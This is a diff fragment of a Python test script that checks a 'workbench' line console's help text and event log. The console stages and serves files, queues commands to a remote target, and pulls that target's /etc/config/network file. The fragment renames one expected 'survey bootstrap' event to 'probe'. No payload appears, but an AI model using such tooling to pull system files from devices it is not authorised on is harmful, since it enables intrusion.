                 "daemon [ACTION] [--dry-run]     inspect or run daemon/systemd workflow" not in line_console_stdout or
                 "upload [--start] LOCAL [NAME]   stage and optionally serve a local file" not in line_console_stdout or
                 "fetch [--queue] [--start] NAME  show or queue target fetch of staged file" not in line_console_stdout or
@@ -10766,7 +10766,7 @@ def main():
                 not any(event.get("event") == "command_queue_queued" and (event.get("details") or {}).get("target_id") == "line-console-target" for event in line_console_events) or
                 not any(event.get("event") == "workbench_command_result_inspected" and (event.get("details") or {}).get("target_id") == "line-console-target" and (event.get("details") or {}).get("has_result") is False for event in line_console_events) or
                 not any(event.get("event") == "workbench_command_queue_cleared" and (event.get("details") or {}).get("count", 0) >= 1 for event in line_console_events) or
-                not any(event.get("event") == "workbench_survey_bootstrap_command_shown" and (event.get("details") or {}).get("target_id") == "line-console-target" and (event.get("details") or {}).get("queued") is True for event in line_console_events) or
+                not any(event.get("event") == "workbench_probe_command_shown" and (event.get("details") or {}).get("target_id") == "line-console-target" and (event.get("details") or {}).get("queued") is True for event in line_console_events) or
                 not any(event.get("event") == "workbench_target_download_command_shown" and (event.get("details") or {}).get("target_id") == "line-console-target" and (event.get("details") or {}).get("target_upload_path") == "/etc/config/network" and (event.get("details") or {}).get("queued") is True for event in line_console_events) or
                 not any(event.get("event") == "workbench_staged_fetch_command_shown" and (event.get("details") or {}).get("target_id") == "line-console-target" and (event.get("details") or {}).get("request_name") == "console-upload" and (event.get("details") or {}).get("queued") is True for event in line_console_events) or
                 len([event for event in line_console_events if event.get("event") == "workbench_command_queue_inspected"]) < 2 or
